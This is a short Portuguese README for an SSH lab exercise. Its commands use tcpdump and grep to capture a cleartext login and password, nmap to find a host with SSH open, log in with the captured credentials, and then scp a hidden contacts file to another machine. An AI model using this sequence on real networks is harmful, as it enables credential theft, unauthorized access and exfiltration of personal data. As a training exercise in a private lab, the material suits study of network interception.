# Um simples Lab de SSH 
## Exercicio de Intercept onde em uma maquina deve estar rodando o cliente e em outra um server com elas se comunicando deve-se rodar um tcpdump e filtrar os dados de login e senha, para ganhar acesso e usar o nmap para achar o IP com acesso via ssh Open, logar usar ls -la para find pasta .dados e copiar com scp os dados contatos.txt 

### Bem Simples
## Rode em Linux em Ambiente 100por cento Linux 
* $  tcpdump -i wlp2s0 -A | grep Login
=Login: Fernando

* $  tcpdump -i wlp2s0 -A | grep senha
=senha: quadrado

* $ nmap -p 22 192.168.0.1/24 # get ip 192.168.0.6 neste caso é o com open port 
* $ ssh -l Fernando 192.168.0.6
* $ ls -la 
* $ cd .dados
* $ scp contatos.txt delicia@192.168.0.2:/home/delicia/dados
* $ exit # bjk flow 
